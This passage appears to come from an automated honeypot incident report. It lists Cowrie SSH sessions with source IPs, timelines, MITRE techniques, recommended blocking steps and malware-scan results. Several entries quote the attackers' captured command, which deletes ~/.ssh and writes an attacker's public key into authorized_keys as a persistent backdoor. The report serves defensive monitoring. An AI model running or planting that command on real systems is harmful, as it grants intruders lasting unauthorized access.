| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:37:36` | `cowrie.session.connect` |
| `2026-04-25 10:37:36` | `cowrie.client.version` |
| `2026-04-25 10:37:36` | `cowrie.client.kex` |
| `2026-04-25 10:37:37` | `cowrie.login.success` |
| `2026-04-25 10:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b2a7601ff71

| Field | Detail |
|---|---|
| **Source IP** | `103.164.9[.]74` |
| **First Seen** | 2026-04-25 10:39 |
| **Last Seen** | 2026-04-25 10:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:39:09` | `cowrie.session.connect` |
| `2026-04-25 10:39:09` | `cowrie.client.version` |
| `2026-04-25 10:39:09` | `cowrie.client.kex` |
| `2026-04-25 10:39:09` | `cowrie.login.success` |
| `2026-04-25 10:39:09` | `cowrie.session.params` |
| `2026-04-25 10:39:09` | `cowrie.command.input` |
| `2026-04-25 10:39:09` | `cowrie.command.failed` |
| `2026-04-25 10:39:09` | `cowrie.log.closed` |
| `2026-04-25 10:39:10` | `cowrie.session.params` |
| `2026-04-25 10:39:10` | `cowrie.command.input` |
| `2026-04-25 10:39:10` | `cowrie.session.file_download` |
| `2026-04-25 10:39:10` | `cowrie.log.closed` |
| `2026-04-25 10:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.164.9[.]74` to AbuseIPDB if not already reported
- [ ] Block `103.164.9[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14325063ce7a

| Field | Detail |
|---|---|
| **Source IP** | `103.164.9[.]74` |
| **First Seen** | 2026-04-25 10:39 |
| **Last Seen** | 2026-04-25 10:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:39:11` | `cowrie.session.connect` |
| `2026-04-25 10:39:11` | `cowrie.client.version` |
| `2026-04-25 10:39:11` | `cowrie.client.kex` |
| `2026-04-25 10:39:11` | `cowrie.login.success` |
| `2026-04-25 10:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.164.9[.]74` to AbuseIPDB if not already reported
- [ ] Block `103.164.9[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f3acd85ce95

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:39 |
| **Last Seen** | 2026-04-25 10:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:39:41` | `cowrie.session.connect` |
| `2026-04-25 10:39:41` | `cowrie.client.version` |
| `2026-04-25 10:39:41` | `cowrie.client.kex` |
| `2026-04-25 10:39:42` | `cowrie.login.success` |
| `2026-04-25 10:39:43` | `cowrie.session.params` |
| `2026-04-25 10:39:43` | `cowrie.command.input` |
| `2026-04-25 10:39:43` | `cowrie.command.failed` |
| `2026-04-25 10:39:43` | `cowrie.log.closed` |
| `2026-04-25 10:39:43` | `cowrie.session.params` |
| `2026-04-25 10:39:43` | `cowrie.command.input` |
| `2026-04-25 10:39:43` | `cowrie.session.file_download` |
| `2026-04-25 10:39:43` | `cowrie.log.closed` |
| `2026-04-25 10:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e60fb0b32b1

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:39 |
| **Last Seen** | 2026-04-25 10:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:39:46` | `cowrie.session.connect` |
| `2026-04-25 10:39:46` | `cowrie.client.version` |
| `2026-04-25 10:39:46` | `cowrie.client.kex` |
| `2026-04-25 10:39:47` | `cowrie.login.success` |
| `2026-04-25 10:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb7d7cf1600b

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:40 |
| **Last Seen** | 2026-04-25 10:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:40:44` | `cowrie.session.connect` |
| `2026-04-25 10:40:44` | `cowrie.client.version` |
| `2026-04-25 10:40:44` | `cowrie.client.kex` |
| `2026-04-25 10:40:45` | `cowrie.login.success` |
| `2026-04-25 10:40:46` | `cowrie.session.params` |
| `2026-04-25 10:40:46` | `cowrie.command.input` |
| `2026-04-25 10:40:46` | `cowrie.command.failed` |
| `2026-04-25 10:40:46` | `cowrie.log.closed` |
| `2026-04-25 10:40:46` | `cowrie.session.params` |
| `2026-04-25 10:40:46` | `cowrie.command.input` |
| `2026-04-25 10:40:47` | `cowrie.session.file_download` |
| `2026-04-25 10:40:47` | `cowrie.log.closed` |
| `2026-04-25 10:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19c81b178bad

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:40 |
| **Last Seen** | 2026-04-25 10:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:40:49` | `cowrie.session.connect` |
| `2026-04-25 10:40:49` | `cowrie.client.version` |
| `2026-04-25 10:40:50` | `cowrie.client.kex` |
| `2026-04-25 10:40:51` | `cowrie.login.success` |
| `2026-04-25 10:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab5bbdb504ec

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:41 |
| **Last Seen** | 2026-04-25 10:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:41:45` | `cowrie.session.connect` |
| `2026-04-25 10:41:45` | `cowrie.client.version` |
| `2026-04-25 10:41:46` | `cowrie.client.kex` |
| `2026-04-25 10:41:48` | `cowrie.login.success` |
| `2026-04-25 10:41:50` | `cowrie.session.params` |
| `2026-04-25 10:41:50` | `cowrie.command.input` |
| `2026-04-25 10:41:50` | `cowrie.command.failed` |
| `2026-04-25 10:41:51` | `cowrie.log.closed` |
| `2026-04-25 10:41:51` | `cowrie.session.params` |
| `2026-04-25 10:41:51` | `cowrie.command.input` |
| `2026-04-25 10:41:51` | `cowrie.session.file_download` |
| `2026-04-25 10:41:51` | `cowrie.log.closed` |
| `2026-04-25 10:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a8a3c98d7af

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:41 |
| **Last Seen** | 2026-04-25 10:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:41:54` | `cowrie.session.connect` |
| `2026-04-25 10:41:54` | `cowrie.client.version` |
| `2026-04-25 10:41:54` | `cowrie.client.kex` |
| `2026-04-25 10:41:55` | `cowrie.login.success` |
| `2026-04-25 10:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9e64287a644

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:42 |
| **Last Seen** | 2026-04-25 10:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:42:47` | `cowrie.session.connect` |
| `2026-04-25 10:42:47` | `cowrie.client.version` |
| `2026-04-25 10:42:47` | `cowrie.client.kex` |
| `2026-04-25 10:42:48` | `cowrie.login.success` |
| `2026-04-25 10:42:48` | `cowrie.session.params` |
| `2026-04-25 10:42:48` | `cowrie.command.input` |
| `2026-04-25 10:42:48` | `cowrie.command.failed` |
| `2026-04-25 10:42:48` | `cowrie.log.closed` |
| `2026-04-25 10:42:49` | `cowrie.session.params` |
| `2026-04-25 10:42:49` | `cowrie.command.input` |
| `2026-04-25 10:42:49` | `cowrie.session.file_download` |
| `2026-04-25 10:42:49` | `cowrie.log.closed` |
| `2026-04-25 10:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0965b86d0de

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:42 |
| **Last Seen** | 2026-04-25 10:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:42:52` | `cowrie.session.connect` |
| `2026-04-25 10:42:52` | `cowrie.client.version` |
| `2026-04-25 10:42:52` | `cowrie.client.kex` |
| `2026-04-25 10:42:53` | `cowrie.login.success` |
| `2026-04-25 10:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2408f0e3a8e0

| Field | Detail |
|---|---|
| **Source IP** | `152.250.243[.]47` |
| **First Seen** | 2026-04-25 10:43 |
| **Last Seen** | 2026-04-25 10:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:43:34` | `cowrie.session.connect` |
| `2026-04-25 10:43:34` | `cowrie.client.version` |
| `2026-04-25 10:43:34` | `cowrie.client.kex` |
| `2026-04-25 10:43:35` | `cowrie.login.success` |
| `2026-04-25 10:43:36` | `cowrie.session.params` |
| `2026-04-25 10:43:36` | `cowrie.command.input` |
| `2026-04-25 10:43:36` | `cowrie.command.failed` |
| `2026-04-25 10:43:36` | `cowrie.log.closed` |
| `2026-04-25 10:43:37` | `cowrie.session.params` |
| `2026-04-25 10:43:37` | `cowrie.command.input` |
| `2026-04-25 10:43:37` | `cowrie.session.file_download` |
| `2026-04-25 10:43:37` | `cowrie.log.closed` |
| `2026-04-25 10:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.250.243[.]47` to AbuseIPDB if not already reported
- [ ] Block `152.250.243[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7054732df9b

| Field | Detail |
|---|---|
| **Source IP** | `152.250.243[.]47` |
| **First Seen** | 2026-04-25 10:43 |
| **Last Seen** | 2026-04-25 10:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:43:41` | `cowrie.session.connect` |
| `2026-04-25 10:43:41` | `cowrie.client.version` |
| `2026-04-25 10:43:41` | `cowrie.client.kex` |
| `2026-04-25 10:43:43` | `cowrie.login.success` |
| `2026-04-25 10:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.250.243[.]47` to AbuseIPDB if not already reported
- [ ] Block `152.250.243[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b89f3a8a8212

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:44 |
| **Last Seen** | 2026-04-25 10:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:44:54` | `cowrie.session.connect` |
| `2026-04-25 10:44:54` | `cowrie.client.version` |
| `2026-04-25 10:44:54` | `cowrie.client.kex` |
| `2026-04-25 10:44:55` | `cowrie.login.success` |
| `2026-04-25 10:44:55` | `cowrie.session.params` |
| `2026-04-25 10:44:55` | `cowrie.command.input` |
| `2026-04-25 10:44:55` | `cowrie.command.failed` |
| `2026-04-25 10:44:56` | `cowrie.log.closed` |
| `2026-04-25 10:44:56` | `cowrie.session.params` |
| `2026-04-25 10:44:56` | `cowrie.command.input` |
| `2026-04-25 10:44:56` | `cowrie.session.file_download` |
| `2026-04-25 10:44:56` | `cowrie.log.closed` |
| `2026-04-25 10:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5817769b8c7b

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:44 |
| **Last Seen** | 2026-04-25 10:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:44:59` | `cowrie.session.connect` |
| `2026-04-25 10:44:59` | `cowrie.client.version` |
| `2026-04-25 10:44:59` | `cowrie.client.kex` |
| `2026-04-25 10:45:00` | `cowrie.login.success` |
| `2026-04-25 10:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `117.159.39[.]226` | **28** | 2026-04-25 10:05 | 2026-04-25 10:33 | 49m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.59.94[.]199` | **27** | 2026-04-25 10:16 | 2026-04-25 10:46 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.225.146[.]23` | **27** | 2026-04-25 09:13 | 2026-04-25 09:45 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.210.249[.]152` | **26** | 2026-04-25 09:01 | 2026-04-25 09:50 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.193.65[.]209` | **9** | 2026-04-25 10:36 | 2026-04-25 10:38 | 2m | 4 | `T1110.001` | 🟢 LOW |
| `1.213.214[.]233` | 1 | 2026-04-25 09:53 | 2026-04-25 09:53 | 30s | 0 | `T1592` | 🟢 LOW |
| `101.37.118[.]215` | 1 | 2026-04-25 10:39 | 2026-04-25 10:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.164.9[.]74` | 1 | 2026-04-25 10:39 | 2026-04-25 10:39 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.15[.]138` | 1 | 2026-04-25 10:05 | 2026-04-25 10:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.228.34[.]69` | 1 | 2026-04-25 10:00 | 2026-04-25 10:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.250.243[.]47` | 1 | 2026-04-25 10:43 | 2026-04-25 10:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.1[.]18` | 1 | 2026-04-25 10:48 | 2026-04-25 10:48 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `187.210.77[.]100` | 1 | 2026-04-25 10:01 | 2026-04-25 10:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.142.113[.]25` | 1 | 2026-04-25 09:54 | 2026-04-25 09:54 | 30s | 0 | `T1592` | 🟢 LOW |
| `43.165.186[.]119` | 1 | 2026-04-25 09:15 | 2026-04-25 09:15 | 8s | 0 | `T1592` | 🟢 LOW |
| `49.72.111[.]25` | 1 | 2026-04-25 09:39 | 2026-04-25 09:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `57.128.214[.]238` | 1 | 2026-04-25 10:28 | 2026-04-25 10:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.106.81[.]18` | 1 | 2026-04-25 09:19 | 2026-04-25 09:19 | 14s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
